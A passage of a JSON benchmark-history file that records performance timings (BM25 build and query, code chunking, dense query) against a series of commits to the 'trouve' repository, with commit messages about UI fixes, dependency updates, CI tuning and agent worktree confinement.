          "tree_id": "aa9fd595dd31457a03af1acecb90139ccd68dbe5",
          "url": "https://github.com/jimsimon/trouve/commit/7c4abc8bfa0c0ca9371e93736b9a426bf5c280e9"
        },
        "date": 1784449302333,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4900890.2,
            "range": "± 8143",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37355.885782556754,
            "range": "± 21",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3057166.9117647056,
            "range": "± 4910",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1353954.1770186336,
            "range": "± 6049",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ba9e9b1aecd0c60e8f597257ad71deb690cb52a7",
          "message": "Improve session list status indicators (#78)\n\n* Improve session list status indicators\n\n* Address session indicator review feedback\n\nStop obsolete event followers, cache attention totals, and bound sidebar PR requests. Preserve unread completion state across event-stream reconnects without treating startup history as new work.\n\n* Retry failed sidebar PR lookups\n\nKeep transient lookup failures out of the navigation PR cache so later session reloads can retry them.",
          "timestamp": "2026-07-19T04:35:01-04:00",
          "tree_id": "f7de48f1c758da2425fb2a5de775b14921132f88",
          "url": "https://github.com/jimsimon/trouve/commit/ba9e9b1aecd0c60e8f597257ad71deb690cb52a7"
        },
        "date": 1784450231988,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4866505.95,
            "range": "± 7638",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37036.045453550476,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3005060.147058823,
            "range": "± 2366",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1342865.0852713177,
            "range": "± 8611",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ef1f2a00ac3aaac7e551969ff621af41fe0e9529",
          "message": "Keep sidebar controls clear of scrollbar (#91)",
          "timestamp": "2026-07-19T15:32:41-04:00",
          "tree_id": "da3a12c9ea478e6bc465193ef051baa4e9a1bd80",
          "url": "https://github.com/jimsimon/trouve/commit/ef1f2a00ac3aaac7e551969ff621af41fe0e9529"
        },
        "date": 1784489682045,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4311927.416666667,
            "range": "± 6081",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 28123.258067226892,
            "range": "± 9",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2235034,
            "range": "± 1429",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1210919.6979166665,
            "range": "± 16655",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "453794e96213b232a21f6fd8ef6bf089ba970674",
          "message": "Classify Codex tool activity summaries (#74)\n\n* Classify Codex tool activity summaries\n\n* Expand Codex activity classification coverage",
          "timestamp": "2026-07-19T15:35:20-04:00",
          "tree_id": "b22ad1dd43a98c8da972aaf9710567e530a566be",
          "url": "https://github.com/jimsimon/trouve/commit/453794e96213b232a21f6fd8ef6bf089ba970674"
        },
        "date": 1784489849678,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4793053.65,
            "range": "± 13710",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36920.68156462585,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3027169.5,
            "range": "± 797",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1351904.4375461028,
            "range": "± 12947",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "2ff8ab89aa3a36abb2dd2a89354def09baabe373",
          "message": "Update Rust crate toml to v1 (#60)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-19T15:37:07-04:00",
          "tree_id": "bf6420078181c60f0fb89820cd90c30d8fb50171",
          "url": "https://github.com/jimsimon/trouve/commit/2ff8ab89aa3a36abb2dd2a89354def09baabe373"
        },
        "date": 1784489979026,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5090259.25,
            "range": "± 14627",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36072.796604643074,
            "range": "± 7",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2866111.944444444,
            "range": "± 1386",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1525871.6400226757,
            "range": "± 6616",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "0e6584c2b5459fca290c9b00ca5ee7391bc9fdd3",
          "message": "Update dependency @types/node to v24 (#36)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-19T15:38:37-04:00",
          "tree_id": "b38fa27a56472dfa5699f0d2a1f7158024a1a1fb",
          "url": "https://github.com/jimsimon/trouve/commit/0e6584c2b5459fca290c9b00ca5ee7391bc9fdd3"
        },
        "date": 1784490107576,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4847470,
            "range": "± 7620",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37012.1787136599,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3070591.117647059,
            "range": "± 1443",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1386983.972457627,
            "range": "± 10107",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "05b7f1af23673fd17ce3ebe50ab723062f8ba62e",
          "message": "Describe active tool calls during turns (#90)",
          "timestamp": "2026-07-19T15:40:42-04:00",
          "tree_id": "86a7b89182e7e315628234edc3743c62000cfd42",
          "url": "https://github.com/jimsimon/trouve/commit/05b7f1af23673fd17ce3ebe50ab723062f8ba62e"
        },
        "date": 1784490240138,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4359232.583333334,
            "range": "± 7394",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 26140.409621159622,
            "range": "± 42",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2252215.9130434785,
            "range": "± 2240",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 813076.1328545026,
            "range": "± 2711",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ddc34003264b60311d61c986d950a6f71184597c",
          "message": "Confine vendor agents to session worktrees (#79)\n\n* Confine vendor agents to session worktrees\n\nRun Cursor ACP processes per worktree so process cwd fallbacks cannot mutate the main checkout. Deny structured vendor writes that escape the worktree and bound idle Cursor and Claude process retention.\n\n* Canonicalize Cursor cwd assertions on macOS",
          "timestamp": "2026-07-19T16:32:05-04:00",
          "tree_id": "a3cf55903bde8c98feb5295df949e654258fae85",
          "url": "https://github.com/jimsimon/trouve/commit/ddc34003264b60311d61c986d950a6f71184597c"
        },
        "date": 1784493254764,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5098013.7,
            "range": "± 7372",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35752.264424860856,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2869495.861111111,
            "range": "± 4093",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1454532.5219506407,
            "range": "± 17134",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "380175279b2960afb5f39481cd7dce4b881ecaf0",
          "message": "Speed up CI test runs (#95)\n\n* Speed up CI test runs\n\nThe test workflow took ~20 minutes per PR. Per-job timings showed most\nof it was avoidable:\n\n- Gate the full-workspace release build (10-13 min, thin LTO +\n  codegen-units=1) to pushes to main. PRs keep release-compile coverage\n  of trouve-search via the bench and parity jobs; release.yml covers\n  the rest on tags.\n- Scope test-with-model to trouve-search, the only crate with\n  #[ignore]d tests, instead of compiling all 12 crates (including the\n  Slint GUI code — which is also why the job needed fontconfig/dbus;\n  that apt step is gone too).\n- Add a concurrency group so superseded PR runs are cancelled instead\n  of racing the winners to save the same rust-cache key (runs showed\n  \"Failed to save: Unable to reserve cache\" on every job).\n- Add a lint check that fails if an #[ignore]d test lands outside\n  trouve-search, so the scoped model job can't silently skip one.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Address review: attribute-aware tripwire, least-privilege permissions\n\n- Extend the ignored-test check to also match #[cfg_attr(..., ignore)]\n  forms, with a word boundary so identifiers like `ignored` don't match.\n  Comment/string false positives remain possible but fail loudly, which\n  is the cheap direction to be wrong in.\n- Add `permissions: contents: read` to the test and lint workflows;\n  every job only checks out, builds, tests, and caches.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-19T16:40:10-04:00",
          "tree_id": "84b0d900ee5e7d90455813ad13be2db5b677a36a",
          "url": "https://github.com/jimsimon/trouve/commit/380175279b2960afb5f39481cd7dce4b881ecaf0"
        },
        "date": 1784493743223,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5172859,
            "range": "± 11457",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36142.673136645964,
            "range": "± 8",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2889313.75,
            "range": "± 3132",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1543744.9090909092,
            "range": "± 11735",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f3e73087b9fe724bce548d9f431b73fa4d80e00f",
          "message": "Render Markdown tables (#87)",
          "timestamp": "2026-07-19T17:01:07-04:00",
          "tree_id": "b0c22119d31d18d3f8aff12772254f2e85b57b54",
          "url": "https://github.com/jimsimon/trouve/commit/f3e73087b9fe724bce548d9f431b73fa4d80e00f"
        },
        "date": 1784494995434,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5031118.199999999,
            "range": "± 6664",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35965.959256459144,
            "range": "± 7",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2697650.236842105,
            "range": "± 455",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1589515.2335714286,
            "range": "± 9210",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "afa788b9f6662991d0aab70c3d86ba3028b9daf3",
          "message": "Add Pull Request dashboard (#88)\n\n* Add pull request dashboard\n\nGive users an actionable, project-filtered view of review requests, drafts, pending reviews, merge-ready PRs, attention items, and recent merges. Persist accessible group ordering and expose the required workspace PR data through the versioned protocol.\n\n* Bound pull request dashboard requests\n\nLimit cross-workspace fan-out across repeated refreshes, cap PR pagination, and lower per-repository enrichment concurrency to avoid GitHub API request bursts.\n\n* Persist pull request dashboard snapshots\n\nRoute dashboard refreshes through the server event log, replace the state-returning GET with a command-only POST, and fold replayed snapshots in the client.",
          "timestamp": "2026-07-19T17:04:06-04:00",
          "tree_id": "c4d82c34fa080fcbf0933db5bb892dbf0a9c9e02",
          "url": "https://github.com/jimsimon/trouve/commit/afa788b9f6662991d0aab70c3d86ba3028b9daf3"
        },
        "date": 1784495178120,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4991096.388888889,
            "range": "± 14249",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37304.354484294425,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3047015.147058823,
            "range": "± 1246",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1376250.9164133738,
            "range": "± 5695",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "e1aaeb8f9928fb23d3a258956e2d52450c42d22f",
          "message": "Fix session list scrollbar jumps (#93)\n\n* Preserve session list scroll position\n\n* Restore focus after workspace reordering",
          "timestamp": "2026-07-19T18:43:28-04:00",
          "tree_id": "46baa9ed0b50dec1acc1f7a3ef7bca58b91fe0c9",
          "url": "https://github.com/jimsimon/trouve/commit/e1aaeb8f9928fb23d3a258956e2d52450c42d22f"
        },
        "date": 1784501138247,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5052081.25,
            "range": "± 11217",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37328.67479213908,
            "range": "± 19",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2998410.2647058824,
            "range": "± 1693",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1355638.987004104,
            "range": "± 9500",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "fd092dd19d6c436de9767b25014b59ee414cdf4b",
          "message": "Align Markdown table columns across rows (#98)",
          "timestamp": "2026-07-19T19:14:39-04:00",
          "tree_id": "de25a1a33e80850478ad600227644a246340d4ae",
          "url": "https://github.com/jimsimon/trouve/commit/fd092dd19d6c436de9767b25014b59ee414cdf4b"
        },
        "date": 1784503104321,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4991101.35,
            "range": "± 10908",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37149.53612596553,
            "range": "± 138",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3034991.5588235296,
            "range": "± 1198",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1383456.1814769162,
            "range": "± 11085",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "fa586b1f126af811e10caad6410e4f71627b3a4b",
          "message": "Update all non-major dependencies (#54)\n\n* Update all non-major dependencies\n\n* Adapt non-major dependency updates\n\n---------\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\nCo-authored-by: Codex <codex@openai.com>",
          "timestamp": "2026-07-19T19:17:55-04:00",
          "tree_id": "4f933552cd49a01cbcbd135173ccf7a887be7c55",
          "url": "https://github.com/jimsimon/trouve/commit/fa586b1f126af811e10caad6410e4f71627b3a4b"
        },
        "date": 1784503241044,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4893916.722222222,
            "range": "± 12494",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37564.58189187356,
            "range": "± 10",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3049210.7333333334,
            "range": "± 17070",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1373853.9554848967,
            "range": "± 7965",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f3ef43f1bc731fec8eb12e3a261cab7dd0e66926",
          "message": "Add provider tabs and Kimi subscription usage (#81)\n\n* Add provider categories and Kimi usage\n\n* Harden provider usage endpoint validation\n\n* Update protocol snapshot after rebase",
          "timestamp": "2026-07-19T19:36:22-04:00",
          "tree_id": "01faca34b704e92d9ff0f44902c84a30200b5cfa",
          "url": "https://github.com/jimsimon/trouve/commit/f3ef43f1bc731fec8eb12e3a261cab7dd0e66926"
        },
        "date": 1784504307873,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4827715.699999999,
            "range": "± 10534",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36997.150013949926,
            "range": "± 18",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3010987.352941177,
            "range": "± 1481",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1359844.0909090908,
            "range": "± 9981",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "d5fda70b286d47b58a584f3970e56ebde60ca474",
          "message": "Improve prompt composer controls (#72)\n\n* Improve prompt composer controls\n\n* Address prompt composer review feedback\n\n* Fix new chat Clippy lint\n\n* Harden permission mode selection\n\n* Allow attachment-only new chats",
          "timestamp": "2026-07-19T19:36:38-04:00",
          "tree_id": "1b9e0e0ad614136809ec3c2c31b9a4f05e7ce005",
          "url": "https://github.com/jimsimon/trouve/commit/d5fda70b286d47b58a584f3970e56ebde60ca474"
        },
        "date": 1784504481107,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4899766.550000001,
            "range": "± 6339",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37369.65676804475,
            "range": "± 15",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3038486.5,
            "range": "± 1938",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1387102.0059780008,
            "range": "± 6742",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "03c407e00bb38fe717d2e1c11bce72c421627726",
          "message": "Lock file maintenance (#38)\n\n* Lock file maintenance\n\n* Pin plugin Node types for Bun declarations\n\n* Reconcile lockfiles with main\n\n---------\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\nCo-authored-by: Codex <codex@openai.com>",
          "timestamp": "2026-07-19T19:56:44-04:00",
          "tree_id": "abda1cd2ea648af5163367bbcfac987cf25349d2",
          "url": "https://github.com/jimsimon/trouve/commit/03c407e00bb38fe717d2e1c11bce72c421627726"
        },
        "date": 1784505586218,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 3804029.071428572,
            "range": "± 4920",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 27995.265154320987,
            "range": "± 6",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2196602.5434782607,
            "range": "± 3845",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1199656.2482142858,
            "range": "± 5967",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ee24df742f6a1b8a73d4262b982b511045a34037",
          "message": "Generate session titles offline (#96)",
          "timestamp": "2026-07-19T22:27:46-04:00",
          "tree_id": "9b8c303a19cd17e6543be3e402ffa488e99dad88",
          "url": "https://github.com/jimsimon/trouve/commit/ee24df742f6a1b8a73d4262b982b511045a34037"
        },
        "date": 1784514680969,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4824458.277777778,
            "range": "± 9413",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36590.811851958526,
            "range": "± 12",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2987842.588235294,
            "range": "± 3657",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1375303.612121212,
            "range": "± 8906",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f47613187ba03eb2bcc42afc98ceda1a534eafcc",
          "message": "Preserve queued prompt editor during chat updates (#100)",
          "timestamp": "2026-07-19T22:30:20-04:00",
          "tree_id": "1296cd121d2eedd1066500deafd37284c132a064",
          "url": "https://github.com/jimsimon/trouve/commit/f47613187ba03eb2bcc42afc98ceda1a534eafcc"
        },
        "date": 1784514815592,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5022303.85,
            "range": "± 6909",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36656.01749895164,
            "range": "± 13",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3015335.0882352944,
            "range": "± 1004",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1371651.3859180035,
            "range": "± 6567",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "a14b4ae52fa83ab64acde43cc620545204afacbb",
          "message": "Unify multi-instance GitHub PR data (#103)\n\n* Unify multi-instance GitHub PR data\n\nUse OAuth-only account feeds across configured GitHub instances so the dashboard, session indicators, and PR panel share one periodically refreshed snapshot. Add conflict and reviewer-state grouping plus a responsive two-column dashboard.\n\n* Fix stale GitHub integration comments\n\n* Address GitHub dashboard review feedback",
          "timestamp": "2026-07-20T00:21:52-04:00",
          "tree_id": "c882e784d31d860599c593a1dfa2148053608717",
          "url": "https://github.com/jimsimon/trouve/commit/a14b4ae52fa83ab64acde43cc620545204afacbb"
        },
        "date": 1784521530115,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4839625.55,
            "range": "± 9517",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36597.55803571429,
            "range": "± 9",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3007237.0588235296,
            "range": "± 1473",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1390368.7170716114,
            "range": "± 16083",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "237a51c67cbeb09e055d5065e69b70d63054c831",
          "message": "Unify workspace session status indicators (#101)\n\n* Unify session status indicators\n\n* Show failed turns in session status",
          "timestamp": "2026-07-20T00:22:36-04:00",
          "tree_id": "c500463fa4c46554fcaff11e9e0acd6b101cd278",
          "url": "https://github.com/jimsimon/trouve/commit/237a51c67cbeb09e055d5065e69b70d63054c831"
        },
        "date": 1784521674198,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5282191.6,
            "range": "± 16032",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36766.45953999212,
            "range": "± 19",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3020655.794117647,
            "range": "± 2208",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1371275.9826653553,
            "range": "± 10665",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "d16385cbab37676311ffe79612c3bde42206b274",
          "message": "Fix merged UI and PR dashboard regressions (#107)\n\n* Fix merged UI and PR dashboard regressions\n\nKeep new-session pickers at their intended height and use a broadly supported pull-request glyph. Send bodyless command POSTs without a synthetic JSON payload, and avoid dashboard fan-out while connectivity is unavailable.\n\n* Keep composer action button compact\n\n* Bottom-align composer action button\n\n* Keep queued prompt action as Send now\n\n* Select Rustls crypto provider at startup\n\nThe desktop dependency graph enables both Ring and AWS-LC, so Rustls cannot infer a process provider and panics on the first GitHub HTTPS request. Install Ring explicitly before either client or embedded-server networking begins.\n\n* Harden empty POST transport test\n\nKeep loopback networking out of the default offline-safe suite and validate the request through HTTP framing instead of packet boundaries.\n\n* Run ignored client network test in CI\n\nExtend the gated TROUVE_E2E job and its coverage guard now that client-core intentionally owns an ignored loopback test.",
          "timestamp": "2026-07-20T00:55:46-04:00",
          "tree_id": "e512e7ae6f9e3d43b1d54613b59e3bf105ea140e",
          "url": "https://github.com/jimsimon/trouve/commit/d16385cbab37676311ffe79612c3bde42206b274"
        },
        "date": 1784523478453,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4900220.1,
            "range": "± 6790",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37105.11374158249,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2981954.617647059,
            "range": "± 2358",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1374593.5472027971,
            "range": "± 11401",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "070e408d5476ea86aa3be6b468d0b9775e2ab42f",
